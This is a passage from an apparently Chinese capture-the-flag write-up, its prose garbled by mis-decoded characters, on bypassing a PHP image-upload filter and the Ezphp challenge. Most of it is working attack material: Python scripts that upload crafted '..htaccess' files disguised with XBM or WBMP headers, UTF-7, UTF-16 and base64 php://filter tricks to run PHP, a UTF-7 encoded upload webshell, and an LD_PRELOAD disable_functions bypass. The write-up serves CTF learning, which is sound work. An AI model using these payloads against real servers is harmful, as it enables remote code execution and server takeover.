pic is not l33t enough\u0026#34;); } $name = implode(\u0026#34;.\u0026#34;, $parts); move_uploaded_file($tmp_name, $userdir . $name . \u0026#34;.\u0026#34; . $ext); } echo \u0026#34;\u0026lt;h3\u0026gt;Your \u0026lt;a href=$userdir\u0026gt;files\u0026lt;/a\u0026gt;:\u0026lt;/h3\u0026gt;\u0026lt;ul\u0026gt;\u0026#34;; foreach(glob($userdir . \u0026#34;*\u0026#34;) as $file) { echo \u0026#34;\u0026lt;li\u0026gt;\u0026lt;a href=\u0026#39;$file\u0026#39;\u0026gt;$file\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\u0026#34;; } echo \u0026#34;\u0026lt;/ul\u0026gt;\u0026#34;; ?\u0026gt;\u0026lt;h1\u0026gt;Upload your pics!\u0026lt;/h1\u0026gt; \u0026lt;form method=\u0026#34;POST\u0026#34; action=\u0026#34;?\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;image\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; name=upload\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;!-- /?source --\u0026gt; XBM .htaccess æˆ‘ä»¬å¯ä»¥å‘ç°å…¶å®æ˜¯ä¸€ä¸ªé»‘åå•è¿‡æ»¤ï¼Œç„¶åæˆ‘ä»¬å†çœ‹ä¸€ä¸‹ http çš„å“åº”æŠ¥æ–‡ä¸­æœ‰è¿™ä¹ˆä¸€ä¸ªå­—æ®µï¼š\nServer: Apache/2.4.29 (Ubuntu) æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆæƒ³åˆ°å¯èƒ½å¯ä»¥ä¸Šä¼ .htaccessï¼Œä½†æ˜¯å¦‚æœç›´æ¥ä¸Šä¼ .htaccessçš„è¯ï¼Œè‚¯å®šä¼šè¢«ç›´æ¥ waf æ‰\n$parts = explode(\u0026#34;.\u0026#34;, $name); $ext = array_pop($parts); explodeä¼šå°†$nameä»¥.åˆ†å‰²æˆæ•°ç»„\narray(2) { [0]=\u0026gt; string(0) \u0026#34;\u0026#34; [1]=\u0026gt; string(8) \u0026#34;htaccess\u0026#34; } array_popä¼šæŠŠ$partsæ•°ç»„æœ€åä¸€ä¸ªå…ƒç´ å–å‡ºï¼Œå¹¶å°†é•¿åº¦å‡ä¸€ã€‚æ‰€ä»¥å¦‚æœç›´æ¥ä¸Šä¼ .htaccessï¼Œå¾—åˆ°çš„åç¼€å°†æ˜¯htaccessï¼Œå¾—åˆ°\narray(2) { [0]=\u0026gt; string(0) \u0026#34;\u0026#34; } æ¥ç€ä¸¤ä¸ªåˆ¤æ–­ï¼Œç¬¬ä¸€ä¸ªåˆ¤æ–­$parts[0]æ˜¯å¦ä¸ºç©ºï¼Œä¸ºç©ºå°±å°†$parts[0]ç§»é™¤æ•°ç»„ï¼Œç¬¬äºŒä¸ªåˆ¤æ–­$partsé•¿åº¦æ˜¯å¦ä¸º 0 ï¼Œç¬¬ä¸‰ä¸ªåˆ¤æ–­$extæ˜¯å¦åœ¨é»‘åå•é‡Œé¢\nif (empty($parts[0])) { array_shift($parts); } if (count($parts) === 0) { die(\u0026#34;lol filename is empty\u0026#34;); } if (in_array($ext, $disallowed_ext, TRUE)) { die(\u0026#34;lol nice try, but im not stupid dude...\u0026#34;); } æœ¬é¢˜å¯¹äºæ–‡ä»¶åçš„å¤„ç†å¤§è‡´å°±æ˜¯è¿™ä¹ˆå¤„ç†ï¼Œæ‰€ä»¥ç›´æ¥ä¼ .htaccessä¼šåœ¨ç¬¬ä¸€ä¸ªåˆ¤æ–­æ—¶æŠŠ$partså…¨éƒ½ç½®ä¸ºç©ºã€‚\nå› ä¸ºæ–‡ä»¶ååˆ†å‰²æ˜¯ä»¥explode(\u0026quot;.\u0026quot;, $name);åˆ†å‰²ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨å¤šä¸ªç‚¹æ¥è¿›è¡Œç»•è¿‡ï¼Œä¾‹å¦‚å¯ä»¥ç”¨..htaccess\næ¥ä¸‹æ¥å°±æ˜¯ç»•è¿‡åé¢çš„åˆ¤æ–­äº†ï¼Œexif_imagetypeç»•è¿‡æ¯”è¾ƒç®€å•ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ gif çš„å¤´GIF98aç»•è¿‡å°±è¡Œäº†ï¼Œä½†æ˜¯åé¢çš„é•¿åº¦æ£€æµ‹å°±æ¯”è¾ƒéº»çƒ¦äº†ï¼Œè¿™é‡Œ check äº†æ–‡ä»¶å†…å®¹çš„å¤§å°ï¼Œè€Œä¸”é‡è¦çš„æ˜¯.htaccesséœ€è¦æ ‡å‡†çš„æ ¼å¼ï¼Œå¦‚æœå‰é¢æœ‰éæ ‡å‡†å†—ä½™çš„å†…å®¹ï¼Œ.htaccessä¼šè§£æå¤±è´¥ã€‚\n$image_size = getimagesize($tmp_name); if ($image_size[0] !== 1337 || $image_size[1] !== 1337) { die(\u0026#34;lol noob, your pic is not l33t enough\u0026#34;); } æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªæ¯”è¾ƒç‰¹æ®Šçš„å›¾ç‰‡æ ¼å¼\n \næŸ¥çœ‹ wiki æˆ‘ä»¬å¯ä»¥çŸ¥é“\n â€‹\tXBM files differ markedly from most image files in that they take the form of C source files. This means that they can be compiled directly into an application without any preprocessing steps, but it also makes them far larger than their raw pixel data. The image data is encoded as a comma-separated list of byte values, each written in the C hexadecimal notation, \u0026lsquo;0x13\u0026rsquo; for example, so that multiple ASCII characters are used to express a single byte of image information\n å¹¶ä¸”åœ¨ wiki ä¸­æˆ‘ä»¬ä¹Ÿå¯ä»¥å¾—åˆ°ä¸€ä¸ª sample :\n#define test_width 16 #define test_height 7 static char test_bits[] = { 0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80, 0x00, 0x60 }; XBM æ–‡ä»¶ç«Ÿç„¶å¯ä»¥ç”¨#defineæ¥è§„å®šå›¾ç‰‡çš„ width \u0026amp; heightï¼Œè€Œ#åœ¨.htaccessæ–‡ä»¶ä¸­æ°å¥½æ˜¯æ³¨é‡Šç¬¦ï¼Œä¹Ÿä¸ä¼šå¼•èµ·è§£æé”™è¯¯ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¾€è¿™ä¸ªæ–¹å‘å»è¯•ä¸€è¯•ã€‚\n \nå°† width \u0026amp; height æ”¹æˆéœ€è¦çš„æ•°å€¼ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ä¸Šä¼ .htaccessäº†\nwebshell æ—¢ç„¶å¯ä»¥ä¸Šä¼ äº†.htaccessï¼Œé‚£æ¥ä¸‹æ¥å°±æ˜¯åˆ°ä¼  webshell äº†ã€‚\n$image = file_get_contents($tmp_name); if (mb_strpos($image, \u0026#34;\u0026lt;?\u0026#34;) !== FALSE) { die(\u0026#34;why would you need php in a pic.....\u0026#34;); } ä¸»è¦å°±æ˜¯å¯¹\u0026lt;?çš„ç»•è¿‡äº†ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨htaccessçš„å¦å¤–ä¸€äº›æŠ€å·§æ¥è¿›è¡Œç»•è¿‡ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ How to change configuration settings è¿™é‡ŒæŸ¥æ‰¾åˆ° php å…³äº.htaccessçš„å¤„ç†æ–‡æ¡£ã€‚\nå¹¶ä¸”æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªæ¯”è¾ƒæœ‰æ„æ€çš„é€‰é¡¹ï¼š\n â€‹\tzend.multibyte boolean\nEnables parsing of source files in multibyte encodings. Enabling zend.multibyte is required to use character encodings like SJIS, BIG5, etc that contain special characters in multibyte string data. ISO-8859-1 compatible encodings like UTF-8, EUC, etc do not require this option.\nEnabling zend.multibyte requires the mbstring extension to be available.\n ä»¥åŠ\n â€‹\tzend.script_encoding string\nThis value will be used unless a declare(encoding=\u0026hellip;) directive appears at the top of the script. When ISO-8859-1 incompatible encoding is used, both zend.multibyte and zend.script_encoding must be used.\nLiteral strings will be transliterated from zend.script_enconding to mbstring.internal_encoding, as ifmb_convert_encoding() would have been called.\n å¹¶ä¸”æˆ‘ä»¬åœ¨ Supported Character Encodings å¯ä»¥æ‰¾åˆ° php æ”¯æŒçš„ç¼–ç æ–¹å¼ï¼Œæ ¹æ®è¿™ä¸¤ä¸ªé€‰é¡¹æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ç¼–ç çš„å½¢å¼æ¥ç¼–ç æˆ‘ä»¬çš„æ–‡ä»¶å†…å®¹ï¼Œç„¶ååˆ©ç”¨.htaccessçš„è®¾ç½®æ¥è¿›è¡Œè§£ç æ‰§è¡Œã€‚\næ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ UTF-7 ç¼–ç æ¥è¿›è¡Œç¼–ç å†…å®¹ï¼Œå¹¶ä¸”ä½¿ç”¨auto_append_fileæŠŠ.htaccessçš„å†…å®¹åœ¨æ‰§è¡Œæ—¶è¿½åŠ å…¥åˆ°å½“å‰ç›®å½•çš„æ–‡ä»¶ä¸­ï¼Œä¾‹å¦‚åœ¨.htaccessä¸­æˆ‘ä»¬å¯ä»¥è¿™ä¹ˆè¿™ä¹ˆå†™\n#define test_width 1337 #define test_height 1337 AddType application/x-httpd-php .xbm php_flag zend.multibyte 1 php_value zend.script_encoding \u0026quot;UTF-7\u0026quot; php_value auto_append_file .htaccess #+ADw?php phpinfo()+ADs ç„¶åå†ä¸Šä¼ ä¸€ä¸ªå®½åº¦é«˜åº¦ç¬¦åˆè¦æ±‚çš„ xbm æ–‡ä»¶å³å¯ã€‚\n \nå½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–ç¼–ç å•¦ï¼Œæ¯”å¦‚ utf-16ï¼Œä¸€ç§å¤§ç«¯ç¼–ç çš„æ–¹å¼ï¼Œä¸€ä¸ªå­—ç¬¦ç”±ä¸¤ä¸ªå­—èŠ‚ç¼–ç ï¼Œæˆ‘ä»¬å¯ä»¥è¿™ä¹ˆæ„é€ ï¼š\n \nexp.php ä¸­çš„å†…å®¹å°±æ˜¯ä½ æƒ³ä¸Šä¼ çš„ php ä»£ç \nimport requests VALID_XBM = b\u0026#34;\u0026#34;\u0026#34;#define width 1337 #define height 1337\u0026#34;\u0026#34;\u0026#34; URL = \u0026#34;http://your_url/upload/?\u0026#34; RANDOM_DIRECTORY = \u0026#34;674b2fcf215d9e16619a0ad3648e704ee50377e5\u0026#34; COOKIES = { \u0026#34;PHPSESSID\u0026#34; : \u0026#34;fsppftvh6q5kpf8e0b7e9p2le5\u0026#34; } def upload_content(name, content): data = { \u0026#34;image\u0026#34; : (name, content, \u0026#39;image/png\u0026#39;), \u0026#34;upload\u0026#34; : (None, \u0026#34;Submit Query\u0026#34;, None) } return requests.post(URL, files=data, cookies=COOKIES) HT_ACCESS = VALID_XBM + b\u0026#34;\u0026#34;\u0026#34; AddType application/x-httpd-php .zedd php_value zend.multibyte 1 php_value zend.detect_unicode 1 php_value display_errors 1 \u0026#34;\u0026#34;\u0026#34; TARGET_FILE = VALID_XBM + open(\u0026#34;exp.php\u0026#34;, \u0026#39;r\u0026#39;).read().encode(\u0026#39;utf-16\u0026#39;) upload_content(\u0026#34;..htaccess\u0026#34;, HT_ACCESS) upload_content(\u0026#34;source.zedd\u0026#34;, TARGET_FILE) WBMP .htaccess é™¤äº† XBM æ–‡ä»¶ï¼Œå½“ç„¶è¿˜æœ‰å…¶ä»–æ–‡ä»¶å¯ä»¥åˆ©ç”¨å•¦ã€‚ä¾‹å¦‚ wbmp æ ¼å¼çš„å›¾ç‰‡æ–‡ä»¶ã€‚\nå› ä¸ºåœ¨.htaccess ä¸­0x00å¼€å¤´çš„ä¸€è¡Œä¼šä¸#ä¸€æ ·è¢«å½“ä½œæ³¨é‡Šå¤„ç†ï¼Œç„¶åæˆ‘ä»¬ä¹Ÿå¯ä»¥å‘ç°æ ‡å‡†çš„ xbm æ ¼å¼ï¼š\n$\txxd test3.wbmp | head 00000000: 0000 8930 8620 0000 0000 0000 0000 0000 ...0. .......... 00000010: 0000 0000 0000 0000 0012 4908 0002 0081 ..........I..... 00000020: 0440 0000 0000 0000 0000 0000 2400 0009 .@..........$... 00000030: 2092 4800 0000 0000 0000 0000 1248 4012 .H..........H@. 00000040: 4000 0040 2224 954a a4aa 9224 8900 8410 @..@\u0026#34;$.J...$.... 00000050: 0012 52a8 8889 2494 94a5 5540 0000 1000 ..R...$...U@.... 00000060: 0000 5480 0200 0928 0000 0000 0000 002a ..T....(.......* 00000070: 9248 0001 2555 2490 0000 0000 0000 0000 .H..%U$......... 00000080: 0000 0000 0000 0000 1124 a555 5555 5555 .........$.UUUUU 00000090: 52aa 4a55 5555 5555 4aaa a8aa 0000 0000 R.JUUUUUJ....... å¯ä»¥å‘ç°è¿™ä¸ªçš„å¼€å¤´å…¶å®å°±æ˜¯0x00ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬åªéœ€è¦æ›´æ”¹å›¾ç‰‡çš„ width \u0026amp; height å°±å¯ä»¥äº†ï¼Œä½†æ˜¯è²Œä¼¼å¹¶æ²¡æœ‰ä¸€ä¸ªæ ‡å‡†çš„æ–‡ä»¶æ ¼å¼ä¾›æˆ‘ä»¬å‚è€ƒï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥å•ç‹¬ä¸€ä½ä¸€ä½åœ°å»å°è¯•ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªæœ€å°çš„åŸºæœ¬æ²¡æœ‰å†—ä½™æ•°æ®çš„ wbmp æ–‡ä»¶äº†ã€‚\n\u0026lt;?php error_reporting(0); $contents = file_get_contents(\u0026#34;test3.wbmp\u0026#34;); $i = 0; while (true) { $truncated = substr($contents, 0, $i); file_put_contents(\u0026#34;truncated.wbmp\u0026#34;, $truncated); if (exif_imagetype(\u0026#34;truncated.wbmp\u0026#34;)) break; $i += 1; } echo \u0026#34;Shortest file size : $i\\n\u0026#34;; var_dump(exif_imagetype(\u0026#34;truncated.wbmp\u0026#34;)); var_dump(getimagesize(\u0026#34;truncated.wbmp\u0026#34;)); ç„¶åæˆ‘ä»¬å¯ä»¥æ ¹æ® Wireless Application Protocol Bitmap Format ï¼Œå¯ä»¥çœ‹å‡ºå¤§è‡´çš„æ–‡ä»¶æ„é€ ï¼š\n   Field name Field type Size (in bytes) Purpose     Type uintvar variable Type of the image, and is 0 for monochrome bitmaps.   Fixed header byte 1 Reserved. Always 0.   Width uintvar variable Width of the image in pixels.   Height uintvar variable Height of the image in pixels.   Data byte array variable Data bytes arranged in rows â€“ one bit per pixel. A black pixel is denoted by 0 and a white pixel is denoted by 1. Where the row length is not divisible by 8, the row is 0-padded to the byte boundary.    è¿˜æœ‰è¿™ä¸ª wbmp çš„å®½åº¦é«˜åº¦æ ¼å¼æœ‰ç‚¹å¥‡æ€ªï¼Œç¬¬ä¸‰ä½æ˜¯ä»¥ 128 ä¸ºåŸºæ•°ç®—çš„ï¼Œæ‰€ä»¥è¿™é‡Œåªèƒ½å‡‘ä¸€ä¸‹å¾—åˆ° 1337 çš„é«˜ä¸å®½\n \nè¿™é‡Œéœ€è¦æ³¨æ„ä¸€ä¸‹æœ‰ä¸ªå‘ï¼Œç›´æ¥æäº¤çš„è¯è¿˜ä¸çŸ¥ä»€ä¹ˆåŸå› ä¼šè‡ªåŠ¨åŠ ä¸Š0xefbfæ±¡æŸ“äº†åŸæ•°æ®ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦æ‰‹åŠ¨å†™è„šæœ¬äº¤ä¸€ä¸‹ã€‚\nimport requests import base64 VALID_WBMP = b\u0026#34;\\x00\\x00\\x8a\\x39\\x8a\\x39\\x0a\u0026#34; URL = \u0026#34;http://your_url/upload/?\u0026#34; RANDOM_DIRECTORY = \u0026#34;674b2fcf215d9e16619a0ad3648e704ee50377e5\u0026#34; COOKIES = { \u0026#34;PHPSESSID\u0026#34; : \u0026#34;kivnml45mpi9ohknv2i8s8ecoj\u0026#34; } def upload_content(name, content): data = { \u0026#34;image\u0026#34; : (name, content, \u0026#39;image/png\u0026#39;), \u0026#34;upload\u0026#34; : (None, \u0026#34;Submit Query\u0026#34;, None) } response = requests.post(URL, files=data, cookies=COOKIES) HT_ACCESS = VALID_WBMP + b\u0026#34;\u0026#34;\u0026#34; AddType application/x-httpd-php .zedd \u0026#34;\u0026#34;\u0026#34; upload_content(\u0026#34;..htaccess\u0026#34;, HT_ACCESS) webshell æ—¢ç„¶èƒ½ä¼ .htaccessäº†ï¼Œå½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨ä¸Šé¢æåˆ°çš„ UTF-7 ç¼–ç ç»•è¿‡ï¼Œä½†æ˜¯è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ¢å¦ä¸€ç§å½¢å¼ï¼Œæ¯”å¦‚ base64ã€‚\n â€‹\tauto_append_file string\nSpecifies the name of a file that is automatically parsed after the main file. The file is included as if it was called with the require function, so include_path is used.\nThe special value none disables auto-appending.\n è®©æˆ‘ä»¬ä»”ç»†çœ‹çœ‹è¿™ä¸ªå®šä¹‰ï¼Œè¿™ä¸ªåŠŸèƒ½å°±ç›¸å½“äºä½¿ç”¨äº†requireæ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨php://filterå•¦ï¼Œæ¯”å¦‚æˆ‘ä»¬æœ€å¸¸ç”¨çš„æ–‡ä»¶åŒ…å«php://filter/read=convert.base64-decode/resource=\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆä¼ ä¸€ä¸ªç”¨ WBMP æ ¼å¼å¤´ä¼ªè£…çš„æ–‡ä»¶ï¼Œæ–‡ä»¶ä¸­æœ‰ç»è¿‡ base64 ç¼–ç è¿‡åçš„ php ä»£ç ï¼Œç„¶åç»è¿‡.htaccessçš„ä½œç”¨ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œä»»æ„ php ä»£ç äº†ï¼Œä½†æ˜¯è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œbase64 ç¼–ç è§£ç çš„æ—¶å€™ï¼Œä¼šæŠŠæ•´ä¸ªæ–‡ä»¶å†…å®¹å½“ä½œå­—ç¬¦ä¸²è§£ç ï¼Œæ„æ€å°±æ˜¯è¯´ï¼ŒWBMP æ ¼å¼å¤´å½“ç„¶ä¹Ÿä¼šè¢«è§£ç ï¼Œè¿™é‡Œéœ€è¦è®©æ–‡ä»¶å¤´å‡‘å¤Ÿè¶³å¤Ÿçš„ä½æ•°ï¼Œæ¯”å¦‚åœ¨\\x00\\x00\\x8a\\x39\\x8a\\x39\\x0aä¸­ï¼Œè¿™é‡Œä¸€å…±æœ‰ 56 bitï¼Œbase64 åœ¨è§£ç çš„æ—¶å€™ï¼Œ24 bit ä¸ºä¸€ç»„ï¼Œå†åˆ†æˆä¸‰ä¸ªå­—èŠ‚è¿›è¡Œè§£ç ï¼Œ56 bit ä¸è¶³ 72(24*3 ) bit ï¼Œéœ€è¦å»æˆ‘ä»¬æ·»åŠ çš„æ•°æ®è¿›è¡Œè¡¥é½ï¼Œæ‰€ä»¥å°±ä¼šé€ æˆâ€œæ±¡æŸ“â€äº†æˆ‘ä»¬æ„é€ çš„ç¼–ç æ•°æ®ã€‚æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬åªéœ€è¦å†å¢åŠ åˆ° 72 bit å³å¯ï¼Œä¹Ÿå°±æ˜¯ 2(16bit) å­—èŠ‚ï¼Œè®©æ–‡ä»¶å¤´ä¸è¿™ 2 å­—èŠ‚è¢«ä¸€èµ·è§£ç å³å¯ï¼Œè§£ç ç»“æœä¸å½±å“ php è§£æå³å¯ã€‚\næ‰€ä»¥å®Œæ•´è„šæœ¬å¦‚ä¸‹ï¼š\nimport requests import base64 VALID_WBMP = b\u0026#34;\\x00\\x00\\x8a\\x39\\x8a\\x39\\x0a\u0026#34; URL = \u0026#34;http://your_url/upload/?\u0026#34; RANDOM_DIRECTORY = \u0026#34;674b2fcf215d9e16619a0ad3648e704ee50377e5\u0026#34; COOKIES = { \u0026#34;PHPSESSID\u0026#34; : \u0026#34;kivnml45mpi9ohknv2i8s8ecoj\u0026#34; } def upload_content(name, content): data = { \u0026#34;image\u0026#34; : (name, content, \u0026#39;image/png\u0026#39;), \u0026#34;upload\u0026#34; : (None, \u0026#34;Submit Query\u0026#34;, None) } response = requests.post(URL, files=data, cookies=COOKIES) HT_ACCESS = VALID_WBMP + b\u0026#34;\u0026#34;\u0026#34; AddType application/x-httpd-php .zedd php_value auto_append_file \u0026#34;php://filter/convert.base64-decode/resource=source.zedd\u0026#34; \u0026#34;\u0026#34;\u0026#34; TARGET_FILE = VALID_WBMP + b\u0026#34;AA\u0026#34; + base64.b64encode(b\u0026#34;\u0026#34;\u0026#34; \u0026lt;?php phpinfo();?\u0026gt; \u0026#34;\u0026#34;\u0026#34;) upload_content(\u0026#34;..htaccess\u0026#34;, HT_ACCESS) upload_content(\u0026#34;source.zedd\u0026#34;, TARGET_FILE) upload_content(\u0026#34;shell.zedd\u0026#34;, VALID_WBMP) response = requests.post(URL + \u0026#34;/images/\u0026#34; + RANDOM_DIRECTORY + \u0026#34;/shell.zedd\u0026#34;) print(response.text) Get Shell å…ˆçœ‹ phpinfo ï¼Œæœä¸å…¶ç„¶è¿˜è¦ bypass disable_function\npcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,passthru,shell_exec,system,proc_open,popen,pcntl_exec,posix_mkfifo, pg_lo_import, dbmopen, dbase_open, popen, chgrp, chown, chmod, symlink,apache_setenv,define_syslog_variables, posix_getpwuid, posix_kill, posix_mkfifo, posix_setpgid, posix_setsid, posix_uname, proc_close, pclose, proc_nice, proc_terminate,curl_exec,curl_multi_exec,parse_ini_file,show_source,imap_open,fopen,copy,rename,readfile,readlink,tmpfile,tempnam,touch,link,file_put_contents,file,ftp_connect,ftp_ssl_connect æ²¡æœ‰ç¦æ­¢ putenv()ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥ç”¨ LD_PRELOADé‚£ä¸€å¥—å°±è¡Œäº†ã€‚ç„¶è€Œè¿™é‡Œæ²¡æœ‰æƒé™å¯¼è‡´ä¸èƒ½ç›´æ¥ä½¿ç”¨èšå‰‘çš„ as_bypass_php_disable_functions æ’ä»¶ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥è‡ªå·±å†™ä¸€ä¸ªä¸Šä¼ ç•Œé¢ä¸Šä¼ æˆ‘ä»¬éœ€è¦çš„æ–‡ä»¶å°±è¡Œäº†ã€‚æ¯”å¦‚æˆ‘ä»¬å¯ä»¥è¿™ä¹ˆå†™ .htaccess\n#define test_width 1337 #define test_height 1337 AddType application/x-httpd-php .xbm php_flag zend.multibyte 1 php_value zend.script_encoding \u0026quot;UTF-7\u0026quot; php_value auto_append_file .htaccess #+ADw?php if (isset(+ACQAXw-POST+AFsAIg-upload+ACIAXQ)) +AHsAJA-tmp+AF8-name +AD0 +ACQAXw-FILES+AFsAIg-image+ACIAXQBbACI-tmp+AF8-name+ACIAXQA7ACQ-name +AD0 +ACQAXw-FILES+AFsAIg-image+ACIAXQBbACI-name+ACIAXQA7ACQ-parts +AD0 explode(+ACI.+ACI, +ACQ-name)+ADsAJA-ext +AD0 array+AF8-pop(+ACQ-parts)+ADsAJA-name +AD0 implode(+ACI.+ACI, +ACQ-parts)+ADs-move+AF8-uploaded+AF8-file(+ACQ-tmp+AF8-name, +ACI./+ACI.+ACQ-name . +ACI.+ACI . +ACQ-ext)+ADsAfQ?+AD4APA-h1+AD4-Upload your pics+ACEAPA-/h1+AD4APA-form method+AD0AIg-POST+ACI action+AD0AIg?+ACI enctype+AD0AIg-multipart/form-data+ACIAPgA8-input type+AD0AIg-file+ACI name+AD0AIg-image+ACIAPgA8-input type+AD0AIg-submit+ACI name+AD0-upload+AD4APA-/form+AD4- UTF-7 è§£ç ä¹‹åå°±æ˜¯ï¼š\n\u0026lt;?php if (isset($_POST[\u0026#34;upload\u0026#34;])) {$tmp_name = $_FILES[\u0026#34;image\u0026#34;][\u0026#34;tmp_name\u0026#34;];$name = $_FILES[\u0026#34;image\u0026#34;][\u0026#34;name\u0026#34;];$parts = explode(\u0026#34;.\u0026#34;, $name);$ext = array_pop($parts);$name = implode(\u0026#34;.\u0026#34;, $parts);move_uploaded_file($tmp_name, \u0026#34;./\u0026#34;.$name . \u0026#34;.\u0026#34; . $ext);}?\u0026gt;\u0026lt;h1\u0026gt;Upload your pics!\u0026lt;/h1\u0026gt;\u0026lt;form method=\u0026#34;POST\u0026#34; action=\u0026#34;?\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt;\u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;image\u0026#34;\u0026gt;\u0026lt;input type=\u0026#34;submit\u0026#34; name=upload\u0026gt;\u0026lt;/form\u0026gt; ç„¶åå°±æ˜¯ä¸Šä¼  .so æ–‡ä»¶è¿›è¡Œ LD_PRELOAD é‚£ä¸€å¥—äº†ï¼Œæ¯”è¾ƒå‘çš„æ˜¯ï¼Œæ‹¿åˆ° flag è¿˜æ˜¯éœ€è¦ä¸€ä¸ªåœ¨æçŸ­æ—¶é—´å†…ç®—æ•°çš„é—¨æ§›ï¼Œè¿™é‡Œå°±ç›´æ¥å€Ÿé‰´å…¶ä»–äººçš„è„šæœ¬äº†ï¼š\n#!/usr/bin/env perl  use warnings; use strict; use IPC::Open2; $| = 1; chdir \u0026#34;/\u0026#34;; #!!!!!!!!!!!!!!!!!!!!!!!!!! my $pid = open2(\\*out2, \\*in2, \u0026#39;./get_flag\u0026#39;) or die; my $reply = \u0026lt;out2\u0026gt;; print STDOUT $reply; #string: solve captcha.. $reply = \u0026lt;out2\u0026gt;; print STDOUT $reply; #captcha formula my $answer = eval($reply); print STDOUT \u0026#34;answer: $answer\\n\u0026#34;; print in2 \u0026#34; $answer \u0026#34;; #send it to process in2-\u0026gt;flush(); $reply = \u0026lt;out2\u0026gt;; print STDOUT $reply; #flag :D ç›´æ¥ä¼ ä¸Šå»è¿è¡Œå°±è¡Œäº†ã€‚\n \nEzphp è®©æˆ‘ä»¬å›åˆ°æœ¬æ¬¡çš„ä¸»é¢˜ Ezphpï¼Œé¢˜ç›®ç›´æ¥ç»™å‡ºäº†æºç \n\u0026lt;?php $files = scandir(\u0026#39;./\u0026#39;); foreach($files as $file) { if(is_file($file)){ if ($file !== \u0026#34;index.php\u0026#34;) { unlink($file); } } } include_once(\u0026#34;fl3g.php\u0026#34;); if(!isset($_GET[\u0026#39;content\u0026#39;]) || !isset($_GET[\u0026#39;filename\u0026#39;])) { highlight_file(__FILE__); die(); } $content = $_GET[\u0026#39;content\u0026#39;]; if(stristr($content,\u0026#39;on\u0026#39;) || stristr($content,\u0026#39;html\u0026#39;) || stristr($content,\u0026#39;type\u0026#39;) || stristr($content,\u0026#39;flag\u0026#39;) || stristr($content,\u0026#39;upload\u0026#39;) || stristr($content,\u0026#39;file\u0026#39;)) { echo \u0026#34;Hacker\u0026#34;; die(); } $filename = $_GET[\u0026#39;filename\u0026#39;]; if(preg_match(\u0026#34;/[^a-z\\.]/\u0026#34;, $filename) == 1) { echo \u0026#34;Hacker\u0026#34;; die(); } $files = scandir(\u0026#39;./\u0026#39;); foreach($files as $file) { if(is_file($file)){ if ($file !== \u0026#34;index.php\u0026#34;) { unlink($file); } } } file_put_contents($filename, $content . \u0026#34;\\nJust one chance\u0026#34;); ?\u0026gt;å¾ˆæ˜æ˜¾ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å†™å…¥.htaccessæ¥ get flagã€‚\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä»¥ä¸‹é™åˆ¶ï¼š\n æ¯æ¬¡éƒ½ä¼šunlinkåˆ é™¤å½“å‰æ‰€æœ‰æ–‡ä»¶ æœ‰ on / html / type / flag / upload / file å…³é”®å­—å¤§å°å†™è¿‡æ»¤ æ–‡ä»¶è‡ªåŠ¨åŒ…å«fl3g.phpï¼Œä½†æ˜¯æ–‡ä»¶åæœ‰/[^a-z\\.]/æ­£åˆ™é™åˆ¶ æœ€åè¿˜ä¼šæœ‰\\næ¢è¡Œè¿½åŠ æ•°æ®å¯¼è‡´.htaccessè§£æé”™è¯¯çš„é™åˆ¶  è¿™é‡Œæ¯”èµ›çš„æ—¶å€™æ¯”è¾ƒæ¶å¿ƒçš„æ˜¯ ichunqiu è‡ªåŠ¨ç»™å®¹å™¨å¥—äº†ä¸€å±‚ nginx ä»£ç†ï¼Œ404 æˆ–è€… 500 çš„æ—¶å€™è¿”å›çš„æ˜¯ nginx é”™è¯¯é¡µé¢\u0026hellip;ç„¶åå½“æ—¶æˆ‘æ˜¯æ’é™¤äº† .htaccess 